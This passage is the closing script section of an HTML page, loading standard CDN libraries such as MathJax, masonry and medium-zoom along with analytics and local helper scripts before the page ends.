src="https://cdn.jsdelivr.net/npm/imagesloaded@5.0.0/imagesloaded.pkgd.min.js" integrity="sha256-htrLFfZJ6v5udOG+3kNLINIKh2gvoKqwEhHYfTTMICc=" crossorigin="anonymous"></script> <script defer src="/assets/js/masonry.js?a0db7e5d5c70cc3252b3138b0c91dcaf" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script src="/assets/js/no_defer.js?2781658a0a2b13ed609542042a859126"></script> <script defer src="/assets/js/common.js?e0514a05c5c95ac1a93a8dfd5249b92e"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script defer src="/assets/js/jupyter_new_tab.js?d9f17b6adc2311cbabd747f4538bb15f"></script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js" integrity="sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI=" crossorigin="anonymous"></script> <script src="/assets/js/mathjax-setup.js?70d799092f862ad98c7876aa47712e20"></script> <script defer src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6" crossorigin="anonymous"></script> <script async src="https://www.googletagmanager.com/gtag/js?id=G-HL7MJBJN7X"></script> <script defer src="/assets/js/google-analytics-setup.js?1c5d3b199be7049d4732e15d2072d0b2"></script> <script defer src="/assets/js/progress-bar.js?2f30e0e6801ea8f5036fa66e1ab0a71a" type="text/javascript"></script> <script src="/assets/js/vanilla-back-to-top.min.js?f40d453793ff4f64e238e420181a1d17"></script> <script>
+    addBackToTop();
+  </script> <script src="/assets/js/terminal.js?ec2a38fba85ea4751db97d30059cd1c5"></script> </body> </html>
